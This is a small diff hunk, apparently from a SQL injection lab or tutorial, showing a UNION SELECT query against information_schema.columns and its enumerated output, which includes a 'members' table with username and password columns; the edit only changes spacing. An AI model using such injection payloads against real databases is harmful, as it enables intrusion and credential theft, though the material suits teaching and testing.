@@ -12,7 +12,7 @@ UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
 ----------------------------------------------------
 sqlinjection	categories	      id
 sqlinjection	categories	      name
-sqlinjection	categories	 description
+sqlinjection	categories	  description
 sqlinjection	members	          id
 sqlinjection	members	          username
 sqlinjection	members	          password
